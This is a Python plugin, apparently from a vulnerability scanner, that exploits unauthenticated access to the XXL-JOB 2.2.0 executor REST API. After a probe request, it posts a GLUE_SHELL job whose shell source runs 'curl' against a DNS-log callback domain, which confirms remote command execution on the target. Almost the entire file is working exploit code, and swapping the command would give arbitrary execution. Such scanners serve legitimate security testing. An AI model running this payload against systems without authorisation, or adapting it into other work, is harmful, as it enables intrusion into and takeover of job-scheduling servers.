#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *
import random


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    try:
        headers = {"XXL-JOB-ACCESS-TOKEN": "", "Cookie": "XXL_JOB_LOGIN_INDENTITY=1"}
        target = "{}://{}:{}/run".format(service, ip, port)

        r = await http_client(ip, port).get(target, headers=headers, timeout=20)
        if r.text != '{"code":500,"msg":"invalid request, HttpMethod not support."}':
            return

        details = u"未配置AccessToken的情况下，在2.2.0版本的executor会存在HTTP的REST API接口\n" +\
                  u"导致可以通过HTTP来在executor上执行系统命令"
        domain = dns_monitor(ip, port).add_checker('xxl-job-unauth',
                                                   alert_group='Xxl-job Executor API Unauthorized Access',
                                                   details=details)

        job_id = random.randint(1000000, 9999999)
        data = {"glueUpdatetime": 1586629003727, "executorBlockStrategy": "COVER_EARLY",
                "glueSource": "curl http://{}".format(domain), "jobId": job_id,
                "logId": 1, "executorParams": "demoJobHandler", "broadcastIndex": 0,
                "executorHandler": "demoJobHandler", "logDateTime": 1586629003729,
                "glueType": "GLUE_SHELL", "broadcastTotal": 0, "executorTimeout": 0}

        target = "{}://{}:{}/run".format(service, ip, port)
        await http_client(ip, port).post(target, json=data, headers=headers, timeout=20)
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9999, 'http', True, task_msg={})
    run_plugin_test(scan)
